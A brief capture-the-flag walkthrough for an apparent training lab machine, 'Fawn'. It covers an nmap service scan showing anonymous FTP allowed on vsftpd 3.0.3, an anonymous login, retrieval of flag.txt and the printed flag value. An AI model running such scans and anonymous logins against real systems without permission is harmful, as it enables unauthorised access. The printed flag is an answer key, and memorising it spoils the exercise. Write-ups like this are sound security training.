# CTF Walkthrough: Fawn

## Table of Contents
- [1. Introduction](#1-introduction)
- [2. Steps](#2-steps)

---

## 1. Introduction

**Category:** File Trainsfer Protocol (FTP)      
**Difficulty Level:** Very Easy   
**CVE(s) involved:** -

---

## 2. Steps

1. Service Enumeration
    - Command: `nmap -sV -sC 10.129.82.177`
        - Output:
            ```
            PORT   STATE SERVICE VERSION
            21/tcp open  ftp     vsftpd 3.0.3
            | ftp-syst:
            |   STAT:
            | FTP server status:
            |      Connected to ::ffff:10.10.14.170
            |      Logged in as ftp
            |      TYPE: ASCII
            |      No session bandwidth limit
            |      Session timeout in seconds is 300
            |      Control connection is plain text
            |      Data connections will be plain text
            |      At session startup, client count was 3
            |      vsFTPd 3.0.3 - secure, fast, stable
            |_End of status
            | ftp-anon: Anonymous FTP login allowed (FTP code 230)
            |_-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
            Service Info: OS: Unix
            ```

2. Log in to FTP with Anonymous
    - Command: `ftp anonymous@10.129.82.177`

3. Get Flag
    - Command: `get flag.txt`
    - Flag : 035db21c881520061c53e0536e44f815
